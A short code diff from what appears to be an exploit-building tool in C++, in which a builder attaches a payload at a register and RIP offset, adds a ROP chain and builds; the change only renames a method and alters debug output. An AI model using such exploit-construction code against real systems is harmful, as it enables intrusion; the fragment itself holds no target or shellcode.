@@ -117,9 +117,9 @@ int main(int argc, const char** argv) {
     uint64_t rip_off = fake_ops_offs + release_offs;
     builder.AddPayload(payload, Register::RSI, rip_off); // add payload, with register, and rip_offset
     builder.AddRopChain(rop); // add a rop chain
-    if(!builder.build()) exit(-1); // build!
+    if(!builder.Build()) exit(-1); // build it
 
-    printf("[+] %s\n", builder.GetDescription().c_str());
+    builder.PrintDebugInfo();
     #endif
 
     printf("[+] Payload:\n");
